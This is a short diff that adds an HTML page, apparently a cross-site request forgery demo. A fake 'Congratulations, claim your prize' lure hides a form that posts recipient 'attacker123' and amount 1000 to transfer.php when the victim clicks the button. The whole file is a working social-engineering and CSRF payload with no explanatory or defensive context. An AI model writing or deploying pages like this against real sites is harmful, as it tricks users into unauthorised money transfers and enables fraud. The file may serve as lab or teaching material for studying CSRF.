@@ -1,0 +1,18 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim Your Prize!</title>
+</head>
+<body>
+  <h1>🎉 Congratulations! 🎉</h1>
+  <p>You’ve been selected for an exclusive reward.</p>
+  <p>Click the button below to claim your prize.</p>
+
+  <form id="csrf-form" action="./transfer.php" method="POST">
+    <input type="hidden" name="recipient" value="attacker123">
+    <input type="hidden" name="amount" value="1000">
+    <button type="submit">Claim Your Prize</button>
+  </form>
+</body>
+</html>
